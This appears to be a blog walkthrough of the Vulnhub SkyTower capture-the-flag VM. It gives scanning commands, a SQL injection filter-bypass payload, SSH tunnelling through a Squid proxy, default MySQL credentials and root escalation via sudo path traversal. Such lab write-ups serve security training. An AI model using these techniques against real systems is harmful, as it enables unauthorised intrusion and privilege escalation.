---
title: "Vulnhub - SkyTower Writeup"
date: 2019-06-05T19:24:33+08:00
description: ""
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Download here

Target VM: https://download.vulnhub.com/skytower/SkyTower.zip

Difficulty: Intermediate to Advanced

Welcome to SkyTower!

This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town).

You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. 

You will most likely find that automated tools will not assist you.

# Before Start

After you download it, just import to your VMWare workstation and change the network interface type as you pleased. Network is configured via DHCP.

Prepare your Kali and ensure they are in the same subnet.

Open VMware workstation - Edit - Virtual network editor to get the ip range.

## Check VM IP

`nmap -sn -n 172.16.51.0/24`, found: 172.16.51.133

# GOGOGO

## Before Attack

`nmap -A -Pn -p1-65535 -O -oN skytower-nmap 172.16.51.133` Found 80,3128.

Port 22 for SSH is filtered But you got Port 3128 with Squid, so you may need to use the proxy to connect to 22.

`nikto -output $(pwd)/skytower.nikto.txt -host 172.16.51.133 port 80` Found `login.php` So, this is the only result we found.

## Start Attack

Walk through http://172.16.51.133, A login form without any hint.

### SQL Injection

So let's try SQL injection here, Let's review some background:

- SQL sequences allowed you do logical operation
- SQL comment delimiter is: `--` or `#` (MySQL) or `/* */` (Multi-line)

So, firstly, try `' or 1=1 --`, you got the SQL Exception and got `11`, it tells me some keywords **MUST** be blocked and the user input is escaped in some way. 

Common ways to bypass those limitations are encoded with Unicode or URL, however, encoding in this way will produce `#` or `;`, This is not working here.

Let's try to replace some chars, just replace `or` with `||` and `--` with `#`.

Duang! It works.

### After SQL Injection

You found a login page, it told you to login via SSH with credentials.

Credentials on the webpage: `john:hereisjohn`

Login should work with proxy port 3128.

In order to connect to SSH via HTTP proxy, you need a software called `proxytunnel`, `sudo proxytunnel -p 172.16.51.133:3128 -d 127.0.0.1:22 -a 13322 -v`, then `ssh john@127.0.0.1 -p13322 -v`.

### Modify bashrc

After login with correct credentials, you immediately get logged out. This usually caused by incorrect default login shell or incorrect shell config. So just pass a param to bypass it, `ssh -p13322 john@127.0.0.1 /bin/bash`.

You will get an empty shell here: `cat ~/.bashrc`, you will found the last line is a fucking `exit`. Run `sed -i '$ d' ~/.bashrc` to remove last line in `~/.bashrc`. Now, just Ctrl-C to interrupt and reconnect. You will get a full-featured shell.

## Privilege Escalation

Run LinEnum.sh to check it rapidly. After LinEnum.sh, you found that `Linux version 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2` AND ALSO `[+] We can connect to the local MYSQL service with default root/root credentials!`

So SQL Enumerate Users:

```MySQL
show databases;
use SkyTech;
show tables;
select * from login;
```

try to login with each user listed and use `sudo -l` to check if you can get root.

Well, the only user you are able to login here, except john, is: `sara:ihatethisjob`.

However, same trick on bashrc applied here. Repeat the step above.

BUT with `sudo -l`, you'll be disappointed:

```
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

So, you may use `../` to escalate it.

```bash
sara@SkyTower:~$ sudo bash
[sudo] password for sara: 
Sorry, user sara is not allowed to execute '/bin/bash' as root on SkyTower.local.
sara@SkyTower:~$ sudo ls /accounts/../root/
flag.txt
sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
sara@SkyTower:~$ su root
Password: theskytower
root@SkyTower:/home/sara# cd && ls
flag.txt
```

Congrats! ALL DONE!

(FINISHED)

